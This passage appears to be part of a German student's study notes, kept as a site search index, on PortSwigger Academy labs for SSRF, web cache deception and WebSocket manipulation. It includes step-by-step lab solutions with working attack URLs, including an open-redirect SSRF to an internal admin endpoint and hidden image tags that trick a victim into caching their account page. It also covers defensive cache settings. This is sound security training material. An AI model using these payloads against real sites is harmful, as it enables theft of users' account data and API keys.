ausnutzt.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability","title":"Lab: SSRF with filter bypass via open redirection vulnerability","text":"<ol> <li>Wir schauen erstmal wieder die Seite an und schauen wie sie sich verh\u00e4lt</li> <li>Wenn wir stocks aufrufen sehen wir wir k\u00f6nnen keinen direkten Link in die StockAPI eingeben wie bisher</li> <li>Wir klicken auf \u201enext product\u201c und beobachte, dass der path-Parameter in den Location-Header einer Redirect-Antwort \u00fcbernommen wird, was zu einer Open-Redirect-Schwachstelle f\u00fchrt.</li> <li>Jetzt erstellen wir eine URL die dem Aufbau folgt nur eben zur Admin-Page redirected    <code>/product/nextProduct?path=http://192.168.0.12:8080/admin</code></li> <li>Dann in Burp-Repeater und wiederholen f\u00fcr     <code>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</code></li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#blind-ssfr","title":"Blind SSFR","text":"<ul> <li>Normales SSRF: Du bekommst die Antwort vom internen Server zur\u00fcck \u2192 kannst Inhalte sehen.</li> <li>Blind SSRF: Du bringst die Anwendung dazu, eine Anfrage an deine URL oder an ein internes Ziel zu schicken, aber du bekommst keine Antwort zur\u00fcck.</li> <li>Du siehst also nicht direkt, was intern passiert.</li> </ul> <p>Ist relevant weil: - Schwer ausnutzbar weil man keine Antwort bekommt und man gar nicht wei\u00df ob die Angriffe \u00fcberhaupt durchgehen - Aber: Es kann trotzdem gef\u00e4hrlich sein - im schlimmsten Fall sogar bis hin zu Remote Code Execution wenn man den Angriff richtig kombiniert</p> <p>Wie findet man Blind SSRF: - Mit Out-of-Band-Techniken(OAST)     - Du schickst eine URL, die auf einen Server zeigt, den du kontrollierst     - Wenn die Zielanwendung versucht dorthin zu verbinden, siehst du die Anfrage in deinen Logs - Mit Burp Collaborator(Pro Version only)     - Generiert dir eindeutige Subdomains     - Du packst diese in deine Requests     - Wenn die Anwendung darauf zugreift -&gt; Blind SSRF best\u00e4tigt</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#versteckte-angriffsflachen-fur-ssrf-schwachstellen-finden","title":"Versteckte Angriffsfl\u00e4chen f\u00fcr SSRF-Schwachstellen finden","text":"<ul> <li> <p>Partielle URLs in Requests</p> <ul> <li>Manchmal gibst du nur ein St\u00fcck der URL an (z. B. nur den Hostnamen <code>abc.com</code> oder nur einen Pfad <code>/bilder</code>).</li> <li>Die Anwendung baut daraus intern die ganze URL zusammen (<code>http://abc.com/bilder</code>).</li> <li>\u2192 Du hast also nur teilweise Kontrolle, aber evtl. genug, um den Server umzuleiten.</li> </ul> </li> <li> <p>URLs in Datenformaten (z. B. XML)</p> <ul> <li>In manchen Formaten (wie XML) kann man eigene URLs einbauen.</li> <li>Wenn die App das XML parst, kann sie pl\u00f6tzlich deine URL abrufen.</li> <li>\u2192 Das kann SSRF oder sogar XXE (XML External Entity) werden.</li> </ul> </li> <li> <p>SSRF \u00fcber den Referer-Header</p> <ul> <li>Manche Seiten tracken Besucher und gucken sich den Referer-Header an (= von wo du kommst).</li> <li>Die Server-Software ruft dann die Seite aus dem Header ab, um sie zu analysieren.</li> <li>\u2192 Wenn du da deine eigene URL eintr\u00e4gst, ruft der Server sie blind ab = SSRF.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/","title":"1. Web   Caches","text":""},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#allgemein","title":"Allgemein","text":"<ul> <li>Caches sind Zwischenspeicher die zB beim aufrufen von Webseiten entstehen. Diese Speicher sind gute f\u00fcr statische Inhalte wie Bilder o.\u00e4 um schnellen zugriff auf Homepages zu gew\u00e4hrleisten und nicht jedes Mal alle neu laden.<ul> <li>Vorteil: Schnelle Performance auf Webseiten nach dem 1. Mal aufrufen</li> <li>Nachteil: Cache Rules m\u00fcssen f\u00fcr sensible Inhalte festgelegt werden und au\u00dferdem muss eine solide Struktur gew\u00e4hrleistet werden damit nichts abgefangen werden kann.</li> </ul> </li> <li>Die Zwischenspeicher hat jeder Server den der Aufruf durchl\u00e4uft also:<ul> <li>Browser-Cache \u2192 nur lokal beim User.</li> <li>Proxy/ISP-Cache \u2192 im Netzwerk oder beim Provider.</li> <li>CDN/Reverse Proxy Cache (z. B. Cloudflare, Akamai, Fastly) \u2192 weltweit verteilte Server, nah beim User.</li> </ul> </li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#was-ist-ein-cache-key","title":"\ud83d\udd11 Was ist ein Cache Key?","text":"<ul> <li> <p>Wenn eine Anfrage beim Cache ankommt, muss der Cache entscheiden:</p> <ul> <li>Hab ich die Antwort schon gespeichert?</li> <li>Oder muss ich die Anfrage zum Origin-Server weiterleiten?</li> </ul> </li> <li> <p>Daf\u00fcr bildet der Cache einen eindeutigen \u201eSchl\u00fcssel\u201c (Cache Key) aus Teilen der Anfrage.</p> <ul> <li>Standard: URL-Pfad (<code>/account</code>) + Query-Parameter (<code>?id=123</code>).</li> <li>oder auch bestimmte Header (z. B. <code>Accept-Language</code>, <code>Content-Type</code>), Cookies oder sogar Hostnamen</li> </ul> </li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#cache-rules","title":"Cache Rules","text":"<ul> <li>Cache-Rules steuern was und wie lange etwas gecacht werden darf.</li> <li>Typisch: Nur statische Inahlte wie (CSS, JS, Bilder) weil diese seltener wechseln</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#cache-content","title":"Cache Content","text":"<ul> <li>Content der Cache stored werden darf</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#dynamic-content","title":"Dynamic Content","text":"<ul> <li>Content der nicht Cache stored werden darf zB: sensible Daten \u2192 Kontodaten</li> <li>Bekommt Inhalte direkt vom Server</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#arten-von-cache-rules","title":"Arten von Cache-Rules","text":"<ul> <li>File-Extension-Regeln: z. B. <code>.css</code>, <code>.js</code> \u2192 immer cachen.</li> <li>Directory-Regeln: bestimmte Pfade wie <code>/static</code>, <code>/assets</code> \u2192 Inhalte darin werden gecacht.</li> <li>File-Name-Regeln: einzelne Dateien wie <code>robots.txt</code>, <code>favicon.ico</code>.</li> <li>Es gibt auch Custom-Regeln (z. B. anhand von Parametern oder dynamischer Analyse).</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#web-cache-deception","title":"Web Cache Deception","text":""},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#angriff","title":"Angriff","text":"<ul> <li>Angreifer baut URL: <code>../account/home.css</code></li> <li>Cache: denkt ..<code>.css</code> sieht statisch aus -&gt; speicher ich</li> <li>Angreifer geht sp\u00e4ter auf URL zur\u00fcck und bekommt die selben angerufenen Daten zur\u00fcck</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#gegenmanahmen","title":"Gegenma\u00dfnahmen","text":"<ul> <li>Cache Deception Armor: \u00fcberpr\u00fcfen, ob Dateiendung und tats\u00e4chlicher Content-Type logisch zueinander passen, bevor gecacht wird. </li> <li>Strikte Trennung statischer und dynamischer Pfade: Verzeichnisse, die ausschlie\u00dflich statische Assets enthalten, und dynamische Endpunkte klar separieren.</li> <li>Eingegrenzte Cache Keys: z. B. Query-Parameter, Header oder Cookies aus dem Schl\u00fcssel aussparen oder aufnehmen, je nach Relevanz f\u00fcr die Antwort. </li> <li>Nutzung von geeigneten HTTP-Headern (<code>Cache-Control</code>, <code>Vary</code>, <code>Expires</code>, <code>ETag</code>) zur Validierung und Invalidierung von Cache-Eintr\u00e4gen.</li> <li>REST-API -&gt; Keine eigene File sondern eine abstrakte File die Logik aufrut. </li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#lab-exploiting-path-mapping-for-web-cache-deception","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab: Exploiting path mapping for web cache deception","text":"<ol> <li>Seite mit sensiblen Daten suchen -&gt; /my-account</li> <li>Dort sehen wir API-Key den wir von Carlos brauchen</li> <li>Path-Mapping pr\u00fcfen und Zusatz-Segmente hinzuf\u00fcgen /my-account/.. ,asd.html, asd.js, asd.css, asd.ico <ul> <li>Kriterium: Normale Seite kommt zur\u00fcck bzw Server ignoriert Zus\u00e4tze in URL</li> </ul> </li> <li>Cache-Verhalten pr\u00fcfen -&gt; URL 2x aufrufen<ul> <li><code>Cache Miss/Hit</code> <ul> <li>Zweite Antwort deutlich schneller als Erste(schnelles Indiz daf\u00fcr ohne direkt auf Cache-Hit zu achten)</li> </ul> </li> </ul> </li> <li>.ico war Treffer und ergab Cache Hit</li> <li>Baue Expoit <ul> <li>Body: <code>&lt;img src=\"https://0ab100f00494eb0681770cbc006100b9.web-security-academy.net/my-account/foo.ico\"&gt;</code><ul> <li>Ruft Seite auf und direkt ohne Click wird expliot geladen weil es als image verpackt wurde.</li> </ul> </li> </ul> </li> <li>Warte bis Carlos auf Link gedr\u00fcckt hat und lade sp\u00e4ter den selben Link -&gt; Dann sollte sich der Cache laden den Carlos kreiert hat beim \u00f6ffnen. </li> </ol>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/1.%20Web%20-%20Caches/#zusammenfassung-caching-web-cache-deception","title":"\ud83d\uddc2 Zusammenfassung Caching &amp; Web Cache Deception","text":"<ul> <li>Caches gibt\u2019s an verschiedenen Stellen:<ul> <li>Browser-Cache \u2192 nur lokal beim User.</li> <li>Proxy/ISP-Cache \u2192 im Netzwerk oder beim Provider.</li> <li>CDN/Reverse Proxy Cache (z. B. Cloudflare, Akamai, Fastly) \u2192 weltweit verteilte Server, nah beim User.</li> </ul> </li> <li>Ablauf normal:<ul> <li>Cache pr\u00fcft: Hab ich die Ressource schon?<ul> <li>Cache Hit \u2192 Liefere gespeicherte Antwort.</li> <li>Cache Miss \u2192 Hole Antwort vom Origin-Server und speichere sie evtl. ab.</li> </ul> </li> </ul> </li> <li>Cache Key \u2192 entscheidet, ob zwei Anfragen \u201egleich\u201c sind (z. B. anhand von Pfad, Parametern, manchmal Headern).</li> <li> <p>Problem (Web Cache Deception):</p> <ul> <li>Cache interpretiert URL anders als der Origin.</li> <li>Ergebnis: Private, dynamische Antwort landet im Cache (z. B. Konto\u00fcbersicht unter <code>/account/home.css</code>).</li> <li>Angreifer kann diese gecachte Antwort sp\u00e4ter abrufen.</li> </ul> </li> <li> <p>Schutzma\u00dfnahmen:</p> <ul> <li>Sensible Endpunkte \u2192 <code>Cache-Control: no-store, private</code>.</li> <li>Nur statische Ressourcen whitelisten (<code>/static/*</code>, <code>/images/*</code>).</li> <li>CDN/Proxy Regeln setzen: niemals <code>/account</code>, <code>/profile</code> etc. cachen.</li> </ul> </li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/","title":"2. Delimiter Discrepancies","text":""},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#was-sind-delimiter-discrepancies","title":"Was sind Delimiter discrepancies","text":"<p>Delimiters sind Zeichen, die in einer URL Elemente voneinander trennen z. B: <code>/, ?, #, ;</code> Delimiters discrepancies hei\u00dft: verschiedene Komponenten (Origin Server, Cache..) interpretieren diese Trennzeichen anders - dadurch kann derselbe URL-String von Server und Cache unterschiedlich geparsed werden. Das kann dann sp\u00e4ter M\u00f6glichkeiten f\u00fcr Web Cache Deception liefern</p> <p>zB URL:  <code>/profile;asd.css</code> -&gt; F\u00fchrt zu unterschiedlichen Interpretationen</p> <p>Java-Spring: <code>;</code> = Matrix Parameter. Spring sieht die URL <code>/profile</code> als Anfrage und ignoriert den Rest Cache/Proxy: <code>/profile;asd.css</code>  = Viele Caches sehen das ganze als Teil des Pfads und interpretiert das anders. Au\u00dferdem bei .css denkt Cache es ist Cachebar obwohl es vielleicht doch ein Pfad f\u00fcr dynamische Inhalte sein soll.</p>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#haufige-delimiter-normalisierungs-unterschiede","title":"H\u00e4ufige Delimiter / Normalisierungs-Unterschiede","text":"<ul> <li><code>;</code> (Matrix-Parameter)</li> <li><code>/</code> vs. <code>//</code> (mehrere Slashes)</li> <li><code>.</code> und Dateiendungen (<code>.css</code>, <code>.jpg</code>)</li> <li>URL-Encodings (<code>%2F</code>, <code>%2E</code>)</li> <li>Trailing slash (<code>/foo</code> vs <code>/foo/</code>)</li> <li>Pfad-Normalisierung (<code>/a/b/../c</code>)</li> <li>Query-Separator <code>?</code> vs. Pfad-Parameter</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#praktisches-testen-in-burp","title":"Praktisches Testen in (Burp)","text":"<ol> <li>Finde dynamischen Endpoint: <code>/profile</code> oder <code>/my-account</code>.</li> <li> <p>Teste verschiedene Varianten in Repeater:</p> <ul> <li><code>/profile;foo.css</code></li> <li><code>/profile/foo.css</code></li> <li><code>/profile%3Bfoo.css</code> (encoded <code>;</code>)</li> <li><code>/profile%2Ffoo.css</code> (encoded <code>/</code>)</li> <li><code>/profile/../profile.css</code></li> </ul> </li> <li> <p>Schau, ob der Server trotzdem die dynamische Seite zur\u00fcckgibt.</p> </li> <li>Falls ja, pr\u00fcfe Cache-Verhalten (zweiter Request, <code>X-Cache</code>, <code>Age</code>, Antwortzeit).</li> <li>Wenn ohne Cookie dieselbe Seite zur\u00fcckkommt \u2192 Cache-Vergiftung gelungen.</li> </ol> <p>Merke: Manche Browser verabeiten schon Characters wie <code>{, }, &lt;, &gt;, #</code> wodurch dann der eigentliche Exploite Link nicht die korrekte Anfrage an Origin Server schickt -&gt; Verpacke Link als encoded</p>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#best-practice-gegenmanahmen","title":"Best-Practice Gegenma\u00dfnahmen","text":"<ul> <li>Markiere dynamische Antworten: <code>Cache-Control: no-store, private</code> <code>html Cache-Control: no-store, no-cache, private, max-age=0 Pragma: no-cache Vary: Cookie</code></li> <li>Whitelist statischer Pfade (<code>/static/*</code>) statt Endungen pauschal cachen <pre><code># Block dynamische Endpunkte vom Caching\nlocation /my-account {\n    add_header Cache-Control \"no-store, no-cache, private, max-age=0\";\n    add_header Pragma \"no-cache\";\n    add_header Vary \"Cookie\";\n    proxy_pass http://app;\n}\n\n# Nur statische Pfade cachen (whitelist)\nlocation /static/ {\n    proxy_cache my_cache;\n    proxy_cache_valid 200 30d;\n    add_header Cache-Control \"public, max-age=2592000\";\n    proxy_pass http://cdn_origin;\n}\n</code></pre></li> <li>Pfadnormalisierung vereinheitlichen (Proxy + App gleich konfigurieren)</li> <li>CDN/Proxy so konfigurieren, dass ungew\u00f6hnliche Delimiter (<code>;</code>, Encodings) richtig behandelt werden</li> <li><code>Vary: Cookie</code> oder \u00e4hnliche Header nutzen, wenn Responses pro-User unterschiedlich sind</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#lab-part","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab-Part:","text":"<ol> <li>Ziel-Endpunkt identifiziert: <code>/my-account</code> (enth\u00e4lt Benutzer-API-Key, erreichbar mit <code>wiener:peter</code>-Session).</li> <li>Delimiter/Path-Tests: verschiedene Varianten ausprobiert<ul> <li><code>/my-accountAAA</code> \u2192 funktioniert nicht (anderer Pfad \u2192 kein Match).</li> <li><code>/my-account;asd</code> \u2192 Server ignoriert <code>;asd</code> und liefert normale Account-Seite \u2192 Kandidat.</li> </ul> </li> <li>Extension testen: an den Delimiter eine statische Endung geh\u00e4ngt, z. B.<ul> <li>/my-account;asd.css \u2192 Cache-Miss</li> <li><code>/my-account;asd.ico</code> \u2192 Server liefert weiterhin dynamische Account-HTML, Cache sieht aber <code>.ico</code>.</li> </ul> </li> <li>Cache-Verifikation (Priming): <code>/my-account;asd.ico</code> mit g\u00fcltiger Session angefragt \u2192 zweimal senden \u2192 Header zeigten <code>Cache-Control: max-age=30</code>, <code>X-Cache: hit</code>, <code>Age: N</code> \u2192 Cache hat gespeichert.</li> <li> <p>Exploit bauen: Exploit-Server angelegt mit verstecktem Bild, das die URL l\u00e4dt:     <code>&lt;img style=\"display:none\" src=\"https://&lt;lab-domain&gt;/my-account;asd.ico\"&gt;</code></p> <p>\u2192 \u201eDeliver exploit to victim\u201c: Victim (carlos) l\u00e4dt die Seite. 6. Finaler Abruf ohne Cookie: dieselbe URL <code>/my-account;asd.ico</code> ohne Cookie in Burp angefragt \u2192 Cache lieferte carlos\u2019 Account-HTML (API-Key)</p> </li> </ol>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#was-sind-delimiter-decoding-discrepancies","title":"Was sind Delimiter decoding discrepancies","text":"<p>Manchmal werden Daten in der URL \u00fcbertragen die aber eigentlich Sonderzeichen sind. Damit diese Zeichen als Daten behandelt werden muss man diese manchmal encoden (percent-codiert) - Manche Parser decodieren gewisse Zeichen bevor diese weiterverabeitet werden. Wenn ein codiertes Trennzeichen decodiert wird, kann es als Trennzeichen dienen und L\u00fccken schaffen.</p> <p>Origin-Server und Cache-Server decodieren oft unterschiedlich, sodass z. B: <code>/profile%23wcd.css</code> (<code>%23</code> = <code>#</code>) - Der Origin-Server dekodiert <code>%23</code> \u2192 <code>#</code>, nutzt <code>#</code> als Delimiter und interpretiert die Anfrage als <code>/profile</code> \u2192 gibt Profildaten zur\u00fcck. - Der Cache dekodiert <code>%23</code> nicht, sieht also <code>/profile%23wcd.css</code>. Weil das wie <code>*.css</code> aussieht, kann der Cache die Antwort als statische .css-Datei speichern.</p>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#wichtige-encodings","title":"Wichtige Encodings","text":"<pre><code>%3B  ;   (Semikolon)\n%23  #   (Hash)\n%3F  ?   (Question mark)\n%2F  /   (Slash)\n%2E  .   (Dot)\n%00  NUL (Null byte)\n%0A  LF  (Line feed / newline)\n%09  TAB (Tabulator)\n%25  %   (Percent)\n</code></pre>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/2.%20Delimiter%20Discrepancies/#zusatzliche-hinweise-fallen","title":"Zus\u00e4tzliche Hinweise / Fallen","text":"<ul> <li>Intruder: wenn du viele Encodings testen willst, schalte URL-Encoding aus oder gib bereits encodete Payloads ein.</li> <li>Double decoding: Manchmal musst du <code>%253B</code> testen (erst Cache decodiert zu <code>%3B</code>, dann Origin zu <code>;</code>).</li> <li>Nicht-druckbare Zeichen k\u00f6nnen besonders effektiv sein (<code>%00</code>, <code>%0A</code>, <code>%09</code>). Vorsicht beim Einf\u00fcgen/Anzeigen in Tools.</li> <li>TTL &amp; Headers: pr\u00fcfe <code>Cache-Control</code>, <code>Set-Cookie</code>, <code>Vary</code>. <code>no-store</code>/<code>private</code> verhindert meist das Caching.</li> <li>Exakt gleiche URL verwenden f\u00fcr Priming und finalen Abruf \u2014 keine Query-Parameter oder Cache-Buster</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/3.%20Normalization%20Discrepancies/","title":"3. Normalization Discrepancies","text":""},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/3.%20Normalization%20Discrepancies/#was-sind-normalization-discrepancies","title":"Was sind Normalization discrepancies?","text":"<p>Normalisierung = verschiedene Formen einer URL in eine kanonische Form \u00fcberf\u00fchren (z. B. <code>%2F</code> \u2192 <code>/</code>, <code>a/../b</code> \u2192 <code>b</code>). Normalization discrepancy liegt vor, wenn Cache und Origin-Server die URL unterschiedlich normalisieren (decodieren oder Dot-Segmente aufl\u00f6sen). Dadurch kann dieselbe Request-URL vom Cache anders interpretiert werden als vom Origin - Grundlage f\u00fcr Web Cache Deception.</p>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/3.%20Normalization%20Discrepancies/#was-ist-das-problem-dahinter","title":"Was ist das Problem dahinter?","text":"<p>Wenn der Cache eine URL als <code>/static/...</code> sieht (also eine statische Resource) und cacht, aber der Origin dieselbe URL nach Normalisierung als <code>/profile</code> interpretiert und dynamische Inhalte zur\u00fcckgibt, landet dynamischer Inhalt unter einem statischen Cache-Key - Leak!</p> <p>Beispielkonzept: - Du rufst etwas wie:     <code>/static/../../my-account/foo.ico</code></p> <pre><code>- **Cache** sieht den Pfad, sieht `/static/` vorne und denkt: \u201edas ist statisch \u2192 cachebar\u201c.\n- **Origin** normalisiert den Pfad (`/static/../../my-account/foo.ico` \u2192 `/my-account/foo.ico`) und liefert die dynamische Seite.\n- Ergebnis: dynamische Seite landet als `/static/../../my-account/foo.ico` im Cache und kann sp\u00e4ter von jedem abgeholt werden.\n</code></pre>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/3.%20Normalization%20Discrepancies/#lab-part","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab-Part:","text":"<ul> <li> <p>Origin-Normalisierung getestet:</p> <ul> <li>In Burp Repeater <code>GET /static/..%2Fmy-account</code> gesendet.<ul> <li><code>..</code> = Ein verzeichnis hoch</li> <li><code>%2F</code> = <code>/</code> decoded</li> </ul> </li> <li>Ergebnis: Origin decodiert/normalisiert und lieferte die normale <code>/my-account</code>-Seite (Account HTML). \u2192 Origin normalisiert.</li> </ul> </li> <li> <p>Cache-Mapping gepr\u00fcft:</p> <ul> <li>In Burp \u2192 HTTP history geschaut und festgestellt: alle Requests unter <code>/resources/...</code> liefern <code>X-Cache: hit</code> / <code>Age</code> \u2192 der Cache speichert Inhalte mit dem <code>/resources</code>-Prefix. \u2192 /resources ist in Cache-Regel enthalten.</li> </ul> </li> <li> <p>Exploit-URL gebaut:</p> <ul> <li>Payload: <pre><code>&lt;img style=\"display:none\" src=\"https://0ae50035035bf632802f1c9d00340013.web-security-academy.net/resources/..%2Fmy-account\"&gt;\n</code></pre></li> </ul> </li> <li> <p>Diese URL sieht f\u00fcr den Cache wie eine statische <code>/resources/...</code>-Ressource aus, der Origin normalisiert sie aber zu <code>/my-account</code>.</p> </li> <li> <p>Exploit ausgeliefert &amp; gewartet:</p> <ul> <li>Exploit an Ziel (carlos) geliefert; im Exploit-Server-Log best\u00e4tigt, dass das Opfer die Seite geladen hat.</li> </ul> </li> <li> <p>Finaler Abruf (ohne Cookie):</p> <ul> <li>Dieselbe URL (byte-gleich) ohne <code>Cookie:</code> im Repeater angefragt.</li> <li>Ergebnis: Cache lieferte die zuvor von carlos erzeugte Account-Seite \u2192 API-Key erhalten.</li> </ul> </li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/3.%20Normalization%20Discrepancies/#exploiting-cache-server-normalization","title":"Exploiting Cache Server normalization","text":"<p>Wenn Cache und Origin Server URL unterschiedlich decoden kann man sich das manchmal zu nutze machen, sodass man beim Cache eine encoded Anfrage schickt die dann durch einen eingef\u00fcgten Delimeter korrekt beim Origin-Server ankommen obwohl er die Anfrage eigentlich ganz falsch interpretieren w\u00fcrde.</p> <p>Man nutzt Unterschiede aus, wie Cache-Server und Origin-Server URLs interpretieren. - Der Cache normalisiert Pfade (z. B. <code>/profile%2f%2e%2e%2fstatic</code> \u2192 <code>/static</code>). - Der Origin-Server tut das nicht und sieht die URL anders (z. B. <code>/profile%2f%2e%2e%2fstatic</code> \u2192 Fehler oder <code>/profile</code>).</p> <p>Durch einen Delimeter-Trick (z. B. <code>;</code>) kann man erreichen, dass: - Cache: <code>/static</code> \u2192 speichert die Antwort. - Origin-Server: <code>/profile</code> \u2192 gibt dynamische Daten zur\u00fcck.</p>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/3.%20Normalization%20Discrepancies/#lab-part_1","title":"Lab-Part:","text":"<ol> <li> <p>Origin-Delimiter getestet (Intruder):**</p> <ul> <li>In Burp Repeater <code>/my-accountabc</code> \u2192 404.   </li> <li>Anfrage an Intruder geschickt mit Payload-Position <code>/my-account\u00a7\u00a7abc</code>.</li> <li>Liste an Delimitern (<code>?</code>, <code>;</code>, <code>#</code>, <code>%23</code>, <code>%3f</code> \u2026) durchlaufen.       </li> <li>Ergebnis: <code>?</code>, <code>%23</code>, <code>%3f</code>, <code>#</code> liefern 200 OK + API-Key \u2192 Origin interpretiert diese Zeichen als Pfad-Delimiter.</li> </ul> </li> <li> <p>Cache-Verhalten gepr\u00fcft:</p> <ul> <li>In Burp Proxy gesehen: Inhalte unter <code>/resources/...</code> werden gecached (<code>X-Cache: hit/miss</code>).</li> <li>Cache normalisiert <code>..%2f</code> Traversals \u2192 <code>/../</code>.</li> <li>Fazit: Cache-Regel aktiv f\u00fcr <code>/resources/*</code>.</li> </ul> </li> <li> <p>Exploit-URL gebaut:</p> <ul> <li>Payload:     <code>/my-account%23%2f%2e%2e%2fresources</code></li> <li>Origin: durch <code>%23</code> wird nur <code>/my-account</code> ausgeliefert (API-Key).</li> <li>Cache: interpretiert den Rest als <code>/resources/...</code> \u2192 speichert die Antwort.</li> </ul> </li> <li> <p>Exploit ausgeliefert &amp; gewartet:</p> <ul> <li>Im Exploit-Server Script eingebaut: <pre><code>&lt;img style=\"display:none\" src=\"https://0ae50035035bf632802f1c9d00340013.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?\"&gt;\n</code></pre></li> </ul> </li> <li> <p>Finaler Abruf (ohne Cookie):</p> <ul> <li>Dieselbe URL ohne <code>Cookie:</code> erneut abgerufen.</li> <li>Ergebnis: Cache lieferte Carlos\u2019 Account-Seite inkl. API-Key.</li> </ul> </li> </ol>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/4.%20Best-Practice%20-%20Prevent%20WND/","title":"4. Best Practice   Prevent WND","text":""},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Web%20Cache%20Deception/4.%20Best-Practice%20-%20Prevent%20WND/#verhindern-von-web-cache-deception","title":"\ud83d\udee1\ufe0f Verhindern von Web Cache Deception","text":"<ul> <li>Cache-Control-Header korrekt setzen: <code>no-store</code>, <code>private</code> f\u00fcr dynamische Inhalte.</li> <li>Apache (\u00fcber <code>.htaccess</code> oder <code>vhost.conf</code>): <pre><code>&lt;FilesMatch \"\\.(php|html)$\"&gt;\n    Header set Cache-Control \"no-store, private\"\n    Header set Pragma \"no-cache\"\n&lt;/FilesMatch&gt;\n</code></pre></li> <li> <p>Nginx: </p><pre><code>location ~ \\.(php|html)$ {\n    add_header Cache-Control \"no-store, private\";\n    add_header Pragma \"no-cache\";\n}\n</code></pre><p></p> </li> <li> <p>CDN-Settings pr\u00fcfen: Caching-Regeln d\u00fcrfen Cache-Control nicht \u00fcberschreiben.</p> </li> <li>CDN-Schutz aktivieren: z. B. Cloudflare \u201eCache Deception Armor\u201c \u2192 pr\u00fcft, ob Content-Type zum Dateityp passt.</li> <li>Konsistenz sicherstellen: Origin und Cache m\u00fcssen URLs gleich interpretieren \u2192 keine Abweichungen bei Normalisierung.</li> </ul>"},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/1.%20Manipulating%20Websockets/","title":"1. Manipulating Websockets","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/1.%20Manipulating%20Websockets/#manipulation-von-websocket-traffic-mit-burp-suite","title":"\ud83d\udd27 Manipulation von WebSocket Traffic (mit Burp Suite)","text":"<p>Ziel: Schwachstellen finden, indem man WebSocket-Verkehr so ver\u00e4ndert, wie es die Anwendung nicht erwartet.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/1.%20Manipulating%20Websockets/#1-abfangen-modifizieren-von-nachrichten","title":"1. Abfangen &amp; Modifizieren von Nachrichten","text":"<ul> <li>In Burp Proxy aktivieren.</li> <li>Anwendung im Burp-Browser \u00f6ffnen \u2192 im Tab WebSockets history sieht man die Nachrichten.</li> <li>Nachrichten k\u00f6nnen im Intercept-Tab abgefangen, ver\u00e4ndert und dann mit Forward weitergeleitet werden.</li> <li>Man kann einstellen, ob Client \u2192 Server oder Server \u2192 Client Nachrichten abgefangen werden.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/WebSockets%20vulnerabilities/1.%20Manipulating%20Websockets/#2-nachrichten-wiederholen-neu-erzeugen","title":"2. Nachrichten wiederholen &amp; neu erzeugen","text":"<ul> <li>Mit Send to Repeater einzelne Nachrichten in den Repeater schicken.</li> <li>Dort kann man:<ul> <li>Nachrichten beliebig 